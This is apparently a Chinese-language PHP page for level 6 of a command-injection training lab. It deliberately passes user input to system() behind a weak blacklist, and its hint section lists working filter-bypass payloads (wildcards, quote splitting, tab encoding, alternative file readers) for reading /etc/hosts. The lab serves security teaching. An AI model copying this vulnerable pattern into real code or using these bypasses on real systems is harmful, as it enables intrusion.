<?php
/**
 * Level 6: 综合过滤绕过
 * 难度: ★★★☆☆
 * 描述: 同时过滤空格、关键字、特殊符号
 * 目标: 综合运用各种绕过技巧
 */

$message = '';
$output = '';
$blocked = false;
$block_reason = '';

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    // 过滤1: 空格
    if (strpos($cmd, ' ') !== false) {
        $blocked = true;
        $block_reason = '空格';
    }

    // 过滤2: 关键字
    $blacklist = array('cat', 'more', 'less', 'head', 'tail', 'tac', 'whoami', 'passwd');
    if (!$blocked) {
        foreach ($blacklist as $bad) {
            if (stripos($cmd, $bad) !== false) {
                $blocked = true;
                $block_reason = '关键字: ' . $bad;
                break;
            }
        }
    }

    // 过滤3: 部分特殊符号
    $special = array(';', '&', '|', '`', '$', '(', ')');
    if (!$blocked) {
        foreach ($special as $char) {
            if (strpos($cmd, $char) !== false) {
                $blocked = true;
                $block_reason = '特殊符号: ' . $char;
                break;
            }
        }
    }

    if ($blocked) {
        $message = '<div class="error">❌ 检测到: ' . htmlspecialchars($block_reason) . '</div>';
    } else {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
        $message = '<div class="success">✅ 命令执行成功</div>';
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Level 6 - 综合过滤绕过</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
        }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header .difficulty { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #667eea;
        }
        .info-box h3 { color: #333; margin-bottom: 10px; }
        .info-box ul, .info-box ol { margin-left: 20px; line-height: 1.8; color: #666; }
        .form-box {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background: #5568d3; }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #dc3545;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #ffc107;
        }
        .code-box {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box {
            background: #2d2d2d;
            color: #00ff00;
            border: 1px solid #444;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
        }
        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
        .challenge-box {
            background: #ffe5e5;
            border-left: 4px solid #dc3545;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .challenge-box h3 { color: #dc3545; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 6 - 综合过滤绕过</h1>
            <div class="difficulty">难度: ★★★☆☆ | 最终挑战: 多重过滤</div>
        </div>

        <div class="content">
            <div class="challenge-box">
                <h3>🔥 最终挑战</h3>
                <p>这是最难的一关！服务器同时启用了多种过滤机制，你需要综合运用之前学到的所有技巧。</p>
            </div>

            <div class="info-box">
                <h3>📋 过滤规则</h3>
                <ol>
                    <li><strong>空格过滤:</strong> 不能使用空格字符</li>
                    <li><strong>关键字过滤:</strong> cat, more, less, head, tail, tac, whoami, passwd</li>
                    <li><strong>特殊符号过滤:</strong> ; & | ` $ ( )</li>
                </ol>
            </div>

            <div class="info-box">
                <h3>💡 可用的绕过组合</h3>
                <ul>
                    <li><strong>Tab键 (%09):</strong> 绕过空格过滤</li>
                    <li><strong>通配符 (* ?):</strong> 绕过关键字过滤</li>
                    <li><strong>引号拼接:</strong> 绕过关键字检测</li>
                    <li><strong>替代命令:</strong> 使用其他命令实现相同功能</li>
                    <li><strong>重定向符 (<):</strong> 某些场景可代替空格</li>
                    <li><strong>命令路径:</strong> 使用完整路径 /bin/xxx</li>
                </ul>
            </div>

            <div class="info-box">
                <h3>🎯 通关目标</h3>
                <ol>
                    <li>读取 /etc/hosts 文件</li>
                    <li>列出当前目录文件</li>
                    <li>获取当前用户信息</li>
                </ol>
            </div>

            <?php echo $message; ?>

            <div class="form-box">
                <h3>命令执行测试</h3>
                <p style="margin-bottom: 10px;">
                    <span style="color: #dc3545; font-weight: bold;">🚫 过滤列表:</span><br>
                    空格、cat、more、less、head、tail、tac、whoami、passwd、;、&、|、`、$、(、)
                </p>
                <form method="GET">
                    <label>输入命令（需要绕过所有过滤）:</label>
                    <input type="text" name="cmd" placeholder="试试看..." value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" />
                    <input type="submit" value="执行命令" />
                </form>
            </div>

            <?php if ($output !== ''): ?>
            <div class="result-box">
                <h3 style="color: #00ff00; margin-bottom: 10px;">执行结果:</h3>
                <pre><?php echo htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></pre>
            </div>
            <?php endif; ?>

            <div class="hint">
                <strong>🔍 漏洞代码:</strong>
                <div class="code-box">// 多重过滤
if (strpos($cmd, ' ') !== false) die("空格");
foreach (['cat','more','less'...] as $bad) {
    if (stripos($cmd, $bad) !== false) die("关键字");
}
foreach ([';','&','|'...] as $char) {
    if (strpos($cmd, $char) !== false) die("特殊符号");
}
system($cmd);</div>

                <p><strong>解题思路:</strong></p>
                <ul>
                    <li>空格被禁 → 使用 %09 (Tab) 或 <code>${IFS}</code> 或重定向</li>
                    <li>关键字被禁 → 使用通配符、引号拼接、或替代命令</li>
                    <li>特殊符号被禁 → 不能用管道、变量等，只能用基础命令</li>
                </ul>

                <p><strong>攻击示例 - 读取文件:</strong></p>
                <div class="code-box"># 方法1: 通配符 + Tab
?cmd=/???/c*t%09/etc/hosts

# 方法2: 引号拼接 + Tab
?cmd=c""a""t%09/etc/hosts

# 方法3: 反斜杠 + Tab
?cmd=c\a\t%09/etc/hosts

# 方法4: 替代命令 + Tab
?cmd=strings%09/etc/hosts
?cmd=od%09/etc/hosts
?cmd=xxd%09/etc/hosts

# 方法5: 使用 grep
?cmd=grep%09''%09/etc/hosts
?cmd=grep%09'.'%09/etc/hosts</div>

                <p><strong>攻击示例 - 列出文件:</strong></p>
                <div class="code-box"># 简单的 ls
?cmd=ls

# 带参数的 ls（使用Tab）
?cmd=ls%09-la

# 使用通配符形式
?cmd=/???/ls%09-la

# 使用 echo *（显示文件列表）
?cmd=echo%09*</div>

                <p><strong>攻击示例 - 获取用户:</strong></p>
                <div class="code-box"># whoami 被禁，使用替代命令
?cmd=w
?cmd=users
?cmd=who

# 注意: id 和 whoami 被禁了，要用其他命令</div>

                <p><strong>关键点提示:</strong></p>
                <ul>
                    <li>很多简单命令不需要参数，如: <code>w</code>, <code>ls</code>, <code>pwd</code></li>
                    <li><code>%09</code> 是 Tab 键的 URL 编码</li>
                    <li>通配符 <code>*</code> 和 <code>?</code> 不在过滤列表中</li>
                    <li><code>strings</code>, <code>od</code>, <code>xxd</code> 等命令可以读取文件</li>
                    <li>引号和反斜杠可以拆分关键字</li>
                </ul>

                <p style="margin-top: 15px;"><strong>为什么这样也不安全:</strong></p>
                <ul>
                    <li>黑名单永远无法完整</li>
                    <li>绕过方法太多了</li>
                    <li>只要能执行命令，就有办法绕过</li>
                    <li><strong>正确做法:</strong> 使用白名单 + 避免system()函数</li>
                </ul>
            </div>

            <a href="index.php" class="back-link">← 返回首页</a> |
            <a href="level5.php" class="back-link">← 上一关</a> |
            <a href="level7.php" class="back-link">下一关 →</a>
        </div>
    </div>
</body>
</html>
